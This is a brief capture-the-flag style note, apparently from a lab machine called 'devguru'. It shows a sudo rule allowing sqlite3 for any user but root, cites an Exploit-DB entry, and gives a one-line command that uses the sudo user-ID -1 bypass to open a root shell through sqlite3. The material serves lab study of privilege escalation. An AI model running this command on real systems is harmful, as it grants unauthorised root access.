@@ -1,0 +1,16 @@
+vulnerability when sudo permission look like this...
+
+frank@devguru:~/data/data/queues/notification-service$ sudo -l
+Matching Defaults entries for frank on devguru:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User frank may run the following commands on devguru:
+    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
+
+
+exploitdb: https://www.exploit-db.com/exploits/47502
+
+then we can take advantage of it by just running this command this will run sqlite3 as root and execute system command.
+
+
+sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/bash'
